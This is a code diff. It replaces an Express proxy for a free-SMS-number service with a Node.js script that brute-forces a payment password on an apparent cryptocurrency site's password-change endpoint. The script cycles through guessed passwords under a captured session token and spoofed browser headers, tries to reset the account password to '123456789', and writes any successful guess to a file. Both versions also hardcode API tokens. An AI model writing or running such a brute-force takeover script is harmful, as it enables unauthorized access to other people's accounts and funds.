@@ -1,178 +1,90 @@
-const express = require('express');
 const axios = require('axios');
+const fs = require('fs');
+const { promisify } = require('util');
 
-const app = express();
-const port = 3000;
+// Promisify fs.writeFile to use async/await
+const writeFileAsync = promisify(fs.writeFile);
 
+// URL and headers
+const url = "https://api.coinsus.top/addons/cos/user/changePwd?lang=";
+const headers = {
+    "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
+    "Accept-Language": "en",
+    "Sec-Ch-Ua-Mobile": "?0",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
+    "Content-Type": "application/json",
+    "Platform": "H5",
+    "Token": "572ae635-06f3-4dc6-9bbf-4652470e7893",
+    "Sec-Ch-Ua-Platform": '"macOS"',
+    "Accept": "*/*",
+    "Origin": "https://crygn.com",
+    "Sec-Fetch-Site": "cross-site",
+    "Sec-Fetch-Mode": "cors",
+    "Sec-Fetch-Dest": "empty",
+    "Referer": "https://crygn.com/",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Priority": "u=1, i"
+};
 
-app.get('/info/:country/:number', async (req, res) => {
-    const { country, number } = req.params;
+// Possible characters (lowercase letters and digits)
+const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
 
-    try {
-        // Send a POST request to fetch numbers
-        const response = await axios.post('https://api-1.online/post/?action=GetFreeNumbers&type=user', {
-            country_name: country,
-            limit: 10,
-            page: 1
-        }, {
-            headers: {
-                'Authorization': 'Bearer ad49fc981fae0a134e6672c8bafee91f',
-                'Content-Type': 'application/json; charset=UTF-8',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'User-Agent': 'okhttp/4.9.2'
+// Function to generate combinations
+function* generateCombinations(characters, length) {
+    const combos = new Array(length).fill(characters.split(''));
+    while (combos.length > 0) {
+        yield combos.reduce((a, b) => a.flatMap(x => b.map(y => x + y)));
+        for (let i = combos.length - 1; i >= 0; i--) {
+            combos[i].push(...characters.split(''));
+            if (combos[i].length >= characters.length) {
+                combos[i] = [characters.split('')[0]];
+                if (i === 0) {
+                    combos.unshift([characters.split('')[0]]);
+                }
+            } else {
+                break;
             }
-        });
-
-        // Extract numbers array from the response
-        const numbers = response.data.Available_numbers;
-
-        // Find details of the specific number
-        const foundNumber = numbers.find(num => num['E.164'] === `+${number}` || num.number === number);
-
-      const status = foundNumber.status.charAt(0).toUpperCase() + foundNumber.status.slice(1);
-
-
-        if (foundNumber) {
-            const simInfo = {
-                status: status,
-                country: foundNumber.country,
-                receivedToday: `Received Today 198 SMS`,
-                activeSince: `Active since ${foundNumber.time}`
-            };
-
-            res.json({ simInfo });
-        } else {
-            res.status(404).json({ error: 'Number not found' });
         }
-    } catch (error) {
-        console.error('Error:', error);
-        res.status(500).json({ error: 'Internal Server Error' });
     }
-});
+}
 
+// Main function to find the password
+async function findPassword() {
+    const combinations = generateCombinations(characters, 3);
 
-
-
-
-
-
-app.get('/scrape/:country/:number', async (req, res) => {
-    const { country, number } = req.params;
-
-    try {
-        const response = await axios.post('https://api-1.online/post/getFreeMessages', {
-            no: `+${number}`,
-            page: 1
-        }, {
-            headers: {
-                'Authorization': 'Bearer ad49fc981fae0a134e6672c8bafee91f',
-                'Content-Type': 'application/json; charset=UTF-8',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'User-Agent': 'okhttp/4.9.2'
-            }
-        });
-
-        // Extract messages from the response
-        const messages = response.data.messages.map(message => ({
-            sender: message.FromNumber.replace('+', ''),
-            time: message.message_time,
-            text: message.Messagebody
-        }));
-
-        // Construct the desired response object
-        const responseData = {
-            country: country.replace('-', ' '),
-            number: number.replace('-', ''),
-            messages: messages
+    for (let combo of combinations) {
+        const paymentPassword = `hu${combo.join('')}03`;
+        const data = {
+            newPassword: "123456789",
+            confirmPassword: "123456789",
+            walletAddress: "",
+            paymentPassword: paymentPassword,
+            type: "1"
         };
 
-        res.json(responseData);
-    } catch (error) {
-        console.error('Error:', error);
-        res.status(500).json({ error: 'Internal Server Error' });
-    }
-});
+        try {
+            const response = await axios.post(url, data, { headers });
+            if (response.status === 200) {
+                const msg = response.data.msg;
+                if (msg !== "Incorrect payment password") {
+                    console.log(`Success! Found paymentPassword: ${paymentPassword}`);
 
-
-
-async function sendPostRequests(countryName) {
-    try {
-        const response = await axios.post('https://api-1.online/post/?action=GetFreeNumbers&type=user', {
-            country_name: countryName.replace(/-/g, ' '), // Remove dashes from country name
-            limit: 10,
-            page: 1
-        }, {
-            headers: {
-                'Authorization': 'Bearer ad49fc981fae0a134e6672c8bafee91f',
-                'Content-Type': 'application/json; charset=UTF-8',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'User-Agent': 'okhttp/4.9.2'
+                    // Save password to a text file
+                    await writeFileAsync('found_password.txt', paymentPassword);
+                    return; // Exit function since we found the password
+                } else {
+                    console.log(`Tried paymentPassword: ${paymentPassword} - Incorrect password`);
+                }
+            } else {
+                console.log(`Tried paymentPassword: ${paymentPassword} - Error: ${response.status}`);
             }
-        });
-
-        return response.data; // Return the response JSON
-    } catch (error) {
-        throw new Error('Error:', error);
+        } catch (error) {
+            console.error(`Error trying paymentPassword: ${paymentPassword}`, error.message);
+        }
     }
+
+    console.log("Failed to find paymentPassword. Try another approach.");
 }
 
-app.get('/country/:country', async (req, res) => {
-    try {
-        const countryName = req.params.country.replace(/-/g, ' '); // Remove dashes from country name
-        const responseData = await sendPostRequests(countryName);
-
-        // Extract and transform the data
-        const countryData = responseData.Available_numbers.map(item => ({
-            time: item.time,
-            phoneNumber: item['E.164'].replace('+', ''),
-            country: item.country.replace(/\s+/g, '-') // Replace spaces with dashes in country name
-        }));
-
-        res.json({ country: countryName, countryData: countryData });
-    } catch (error) {
-        console.error('Error:', error);
-        res.status(500).json({ error: 'Internal Server Error' });
-    }
-});
-
-
-async function sendPostRequest() {
-    try {
-        const response = await axios.post('https://api-1.online/get/?action=country', {
-            // Add any request body data here if needed
-        }, {
-            headers: {
-                'Content-Type': 'application/json',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'User-Agent': 'okhttp/4.9.2'
-            }
-        });
-
-        // Extract required fields and format the data
-        const formattedData = response.data.records.map(record => ({
-            countryCode: record.Country_Name.replace(/\s+/g, '-'),
-            countryName: record.Country_Name
-        }));
-
-        return { status: 'on', countries: formattedData };
-    } catch (error) {
-        console.error('Error:', error);
-        throw error;
-    }
-}
-
-app.get('/allcountry', async (req, res) => {
-    try {
-        // Trigger the function to send the POST request
-        const responseData = await sendPostRequest();
-        res.json(responseData); // Send response data as JSON
-    } catch (error) {
-        res.status(500).json({ error: 'Internal Server Error' });
-    }
-});
-
-app.use("/images", express.static("images"));
-
-app.listen(port, () => {
-    console.log(`Server is running on port ${port}`);
-});
+// Call the main function to start finding the password
+findPassword();
